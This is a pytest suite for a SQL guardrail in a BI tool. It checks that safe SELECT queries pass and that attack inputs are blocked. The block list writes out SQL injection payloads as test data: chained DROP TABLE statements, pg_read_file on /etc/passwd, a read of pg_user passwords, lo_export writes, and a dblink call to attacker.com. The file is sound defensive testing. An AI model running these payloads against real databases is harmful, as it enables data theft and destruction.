# ==============================================================================
# tests/test_sql_guardrail.py - AST SQL Guardrail Unit Test Suite
#
# Tests sqlglot AST-based validation for NexusBI data marts.
# Invariants tested:
#   - Only SELECT statements are permitted
#   - DDL (DROP, CREATE, ALTER), DML (INSERT, UPDATE, DELETE), TRUNCATE, GRANT blocked
#   - SELECT INTO and FOR UPDATE/SHARE row-locking blocked
#   - Semicolon chaining / multiple statement execution blocked
#   - Schema restricted strictly to 'marts' (blocks raw, staging, pg_catalog, information_schema)
#   - Dangerous functions (pg_sleep, file read, dblink, set_config) blocked
#   - Empty, whitespace, and oversized queries blocked
#   - Safe SELECTs, CTEs, joins, aggregates, window functions allowed
#   - Automatically clamps LIMIT to <= 1000
# ==============================================================================

import pytest
import sys
from pathlib import Path

# Ensure app is in python path
ROOT_DIR = Path(__file__).resolve().parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from app.sql_validator import validate_and_sanitize_sql, ALLOWED_MART_TABLES


SHOULD_PASS = [
    (
        "pass_01_simple_select",
        "SELECT * FROM mart_daily_sales",
        "Simple select on marts table without schema prefix",
    ),
    (
        "pass_02_with_marts_prefix",
        "SELECT sales_date, total_revenue FROM marts.mart_daily_sales",
        "Explicit schema qualification",
    ),
    (
        "pass_03_aggregation_daily_sales",
        "SELECT SUM(total_revenue) AS rev, COUNT(*) AS orders FROM marts.mart_daily_sales WHERE sales_date >= '2018-01-01'",
        "Aggregate functions and WHERE filter",
    ),
    (
        "pass_04_top_products_limit",
        "SELECT category_name, units_sold FROM marts.mart_top_products ORDER BY units_sold DESC LIMIT 10",
        "Explicit ORDER BY and LIMIT 10",
    ),
    (
        "pass_05_group_by_having",
        "SELECT category_name, SUM(total_revenue) FROM marts.mart_top_products GROUP BY category_name HAVING SUM(total_revenue) > 10000",
        "GROUP BY and HAVING clauses",
    ),
    (
        "pass_06_customer_summary_filter",
        "SELECT customer_state, COUNT(*) AS buyers, AVG(total_spend) AS avg_spend FROM marts.mart_customer_summary GROUP BY customer_state",
        "Customer state summary aggregation",
    ),
    (
        "pass_07_delivery_performance_avg",
        "SELECT year_month, avg_delivery_days, pct_late_vs_estimated FROM marts.mart_delivery_performance ORDER BY year_month ASC",
        "Delivery performance trend query",
    ),
    (
        "pass_08_uppercase_schema_and_table",
        "SELECT SALES_DATE, TOTAL_REVENUE FROM MARTS.MART_DAILY_SALES",
        "Uppercase schema and table name handling",
    ),
    (
        "pass_09_quoted_identifiers",
        'SELECT "sales_date", "total_revenue" FROM "marts"."mart_daily_sales"',
        "Quoted identifier normalization",
    ),
    (
        "pass_10_single_cte",
        """
        WITH monthly_agg AS (
            SELECT DATE_TRUNC('month', sales_date) AS mth, SUM(total_revenue) AS mth_rev
            FROM marts.mart_daily_sales
            GROUP BY 1
        )
        SELECT mth, mth_rev FROM monthly_agg ORDER BY mth DESC
        """,
        "Single CTE (WITH .. AS) expression",
    ),
    (
        "pass_11_multiple_ctes",
        """
        WITH top_cats AS (
            SELECT category_name, total_revenue FROM marts.mart_top_products ORDER BY total_revenue DESC LIMIT 5
        ),
        daily_rollup AS (
            SELECT sales_date, total_revenue FROM marts.mart_daily_sales WHERE sales_date >= '2018-01-01'
        )
        SELECT * FROM top_cats
        """,
        "Multiple chained CTEs",
    ),
    (
        "pass_12_self_join",
        """
        SELECT a.sales_date, a.total_revenue, b.total_revenue AS prev_rev
        FROM marts.mart_daily_sales a
        LEFT JOIN marts.mart_daily_sales b ON a.sales_date = b.sales_date + INTERVAL '1 day'
        """,
        "Self join on marts table",
    ),
    (
        "pass_13_window_function",
        "SELECT sales_date, total_revenue, AVG(total_revenue) OVER (ORDER BY sales_date ROWS BETWEEN 6 PRECEDING AND CURRENT ROW) AS rolling_7d FROM marts.mart_daily_sales",
        "Window rolling aggregate function",
    ),
    (
        "pass_14_subquery_in_where",
        "SELECT * FROM marts.mart_top_products WHERE units_sold > (SELECT AVG(units_sold) FROM marts.mart_top_products)",
        "Scalar subquery inside WHERE filter",
    ),
    (
        "pass_15_markdown_fences",
        "```sql\nSELECT category_name, total_revenue FROM marts.mart_top_products LIMIT 5;\n```",
        "Markdown code fences wrapping generated query",
    ),
    (
        "pass_16_inline_comments",
        "SELECT /* sales query */ sales_date, total_revenue FROM marts.mart_daily_sales -- filter by year\nWHERE sales_date >= '2018-01-01'",
        "SQL with legitimate inline comments",
    ),
    (
        "pass_17_excessive_limit_clamped",
        "SELECT * FROM marts.mart_daily_sales LIMIT 5000",
        "Query with limit > 1000 clamped to 1000",
    ),
    (
        "pass_18_case_when_expression",
        """
        SELECT year_month,
               CASE WHEN pct_late_vs_estimated > 5.0 THEN 'High Late' ELSE 'Normal' END AS latency_flag
        FROM marts.mart_delivery_performance
        """,
        "Conditional CASE WHEN projection",
    ),
    (
        "pass_19_date_functions",
        "SELECT EXTRACT(YEAR FROM sales_date) AS yr, SUM(total_revenue) FROM marts.mart_daily_sales GROUP BY 1",
        "Standard PostgreSQL date extraction",
    ),
    (
        "pass_20_subquery_in_from",
        "SELECT sub.customer_state, sub.total_buyers FROM (SELECT customer_state, COUNT(*) AS total_buyers FROM marts.mart_customer_summary GROUP BY 1) sub WHERE sub.total_buyers > 100",
        "Subquery inside FROM clause",
    ),
    (
        "pass_21_cross_mart_join",
        """
        SELECT d.sales_date, d.total_revenue, p.avg_delivery_days
        FROM marts.mart_daily_sales d
        LEFT JOIN marts.mart_delivery_performance p ON DATE_TRUNC('month', d.sales_date) = p.order_month
        """,
        "Join between two approved marts tables",
    ),
    (
        "pass_22_cast_and_coalesce",
        "SELECT category_name, COALESCE(total_revenue, 0)::FLOAT AS revenue_num FROM marts.mart_top_products",
        "Type casting and COALESCE function",
    ),
]


SHOULD_BLOCK = [
    ("block_01_drop_table", "DROP TABLE marts.mart_daily_sales", "DDL DROP TABLE statement"),
    ("block_02_drop_schema", "DROP SCHEMA marts CASCADE", "DDL DROP SCHEMA statement"),
    ("block_03_alter_table", "ALTER TABLE marts.mart_daily_sales ADD COLUMN secret text", "DDL ALTER TABLE statement"),
    ("block_04_create_table", "CREATE TABLE evil_table (id INT PRIMARY KEY)", "DDL CREATE TABLE statement"),
    ("block_05_insert_into", "INSERT INTO marts.mart_daily_sales (sales_date) VALUES ('2025-01-01')", "DML INSERT statement"),
    ("block_06_update_table", "UPDATE marts.mart_daily_sales SET total_revenue = 0", "DML UPDATE statement"),
    ("block_07_delete_from", "DELETE FROM marts.mart_daily_sales WHERE sales_date < '2018-01-01'", "DML DELETE statement"),
    ("block_08_truncate_table", "TRUNCATE TABLE marts.mart_daily_sales", "TRUNCATE statement"),
    ("block_09_grant_privileges", "GRANT ALL ON ALL TABLES IN SCHEMA marts TO public", "GRANT statement"),
    ("block_10_revoke_privileges", "REVOKE ALL ON marts.mart_daily_sales FROM app_readonly", "REVOKE statement"),
    (
        "block_11_semicolon_chaining",
        "SELECT * FROM marts.mart_daily_sales; DROP TABLE marts.mart_top_products;",
        "Multiple statement semicolon chaining",
    ),
    (
        "block_12_chained_selects",
        "SELECT 1; SELECT 2;",
        "Multiple SELECT queries chained by semicolon",
    ),
    (
        "block_13_comment_hidden_drop",
        "SELECT * FROM marts.mart_daily_sales; -- comment\n DROP TABLE marts.mart_daily_sales;",
        "Hidden statement after single-line comment",
    ),
    (
        "block_14_raw_schema_access",
        "SELECT * FROM raw.olist_orders_dataset",
        "Unauthorized access to raw ingestion schema",
    ),
    (
        "block_15_staging_schema_access",
        "SELECT * FROM staging.stg_orders",
        "Unauthorized access to staging transformation schema",
    ),
    (
        "block_16_quoted_raw_access",
        'SELECT * FROM "raw"."olist_customers_dataset"',
        "Quoted raw schema access bypass attempt",
    ),
    (
        "block_17_pg_catalog_prefix",
        "SELECT * FROM pg_catalog.pg_tables",
        "Access to pg_catalog system catalog",
    ),
    (
        "block_18_pg_tables_direct",
        "SELECT tablename FROM pg_tables",
        "Direct query on pg_tables internal view",
    ),
    (
        "block_19_pg_user_direct",
        "SELECT usename, passwd FROM pg_user",
        "Direct query on pg_user credentials catalog",
    ),
    (
        "block_20_information_schema",
        "SELECT * FROM information_schema.tables",
        "Direct query on information_schema",
    ),
    (
        "block_21_pg_sleep_dos",
        "SELECT pg_sleep(10)",
        "Denial-of-service via pg_sleep() function",
    ),
    (
        "block_22_pg_read_file",
        "SELECT pg_read_file('/etc/passwd', 0, 1000)",
        "Arbitrary filesystem read via pg_read_file()",
    ),
    (
        "block_23_pg_ls_dir",
        "SELECT pg_ls_dir('.')",
        "Server directory traversal via pg_ls_dir()",
    ),
    (
        "block_24_lo_export",
        "SELECT lo_export(12345, '/tmp/pwned')",
        "Filesystem write via lo_export()",
    ),
    (
        "block_25_dblink_outbound",
        "SELECT * FROM dblink('host=attacker.com', 'SELECT 1')",
        "Remote connection via dblink extension",
    ),
    (
        "block_26_set_config_tampering",
        "SELECT set_config('search_path', 'raw,public', false)",
        "Session search_path manipulation via set_config()",
    ),
    (
        "block_27_current_setting_read",
        "SELECT current_setting('search_path')",
        "System setting inspection via current_setting()",
    ),
    (
        "block_28_select_into",
        "SELECT * INTO marts.stolen_sales FROM marts.mart_daily_sales",
        "Table creation via SELECT ... INTO",
    ),
    (
        "block_29_for_update_locking",
        "SELECT * FROM marts.mart_daily_sales FOR UPDATE",
        "Row locking via FOR UPDATE clause",
    ),
    (
        "block_30_for_share_locking",
        "SELECT * FROM marts.mart_daily_sales FOR SHARE",
        "Row locking via FOR SHARE clause",
    ),
    (
        "block_31_empty_query",
        "",
        "Empty string query",
    ),
    (
        "block_32_whitespace_only",
        "    \t\n   ",
        "Whitespace-only query",
    ),
    (
        "block_33_none_input",
        None,
        "None / Null query input",
    ),
    (
        "block_34_oversized_query",
        "SELECT * FROM marts.mart_daily_sales WHERE " + "x = 1 AND " * 600 + "y = 1",
        "Denial of service via > 4000 character query",
    ),
    (
        "block_35_unapproved_table",
        "SELECT * FROM unknown_orders_table",
        "Arbitrary unapproved table name",
    ),
    (
        "block_36_public_schema_marts",
        "SELECT * FROM public.mart_daily_sales",
        "Marts table referenced under public schema",
    ),
]


class TestSqlGuardrailPass:
    """Tests queries that MUST pass the security guardrail."""

    @pytest.mark.parametrize("test_id, query, description", SHOULD_PASS)
    def test_should_pass_queries(self, test_id: str, query: str, description: str):
        is_valid, sanitized_sql, reason = validate_and_sanitize_sql(query)
        assert is_valid is True, f"[{test_id}] Expected valid query, failed with reason: {reason}"
        assert sanitized_sql != "", f"[{test_id}] Sanitized SQL should not be empty"
        assert reason == "", f"[{test_id}] Failure reason should be empty on success"

        # Invariant check: Sanitized SQL must include LIMIT <= 1000
        assert "limit" in sanitized_sql.lower(), f"[{test_id}] Sanitized SQL must contain LIMIT clause"


class TestSqlGuardrailBlock:
    """Tests queries that MUST be blocked by the security guardrail."""

    @pytest.mark.parametrize("test_id, query, description", SHOULD_BLOCK)
    def test_should_block_queries(self, test_id: str, query: str, description: str):
        is_valid, sanitized_sql, reason = validate_and_sanitize_sql(query)
        assert is_valid is False, f"[{test_id}] Expected blocked query ({description}), but it passed: {sanitized_sql}"
        assert reason != "", f"[{test_id}] Blocked query must provide a descriptive rejection reason"
        assert len(reason) > 5, f"[{test_id}] Rejection reason is too short"


def test_summary_report(capsys):
    """Prints a structured summary table of test coverage for viva / evaluation."""
    print("\n" + "=" * 70)
    print(" NEXUSBI SQL AST GUARDRAIL TEST SUITE SUMMARY")
    print("=" * 70)
    print(f" Total Safe Query Tests (SHOULD_PASS)  : {len(SHOULD_PASS)}")
    print(f" Total Attack Vector Tests (SHOULD_BLOCK): {len(SHOULD_BLOCK)}")
    print(f" Combined Test Cases                   : {len(SHOULD_PASS) + len(SHOULD_BLOCK)}")
    print(f" Target Schema                         : marts")
    print(f" Whitelisted Tables                    : {', '.join(sorted(ALLOWED_MART_TABLES))}")
    print("=" * 70)

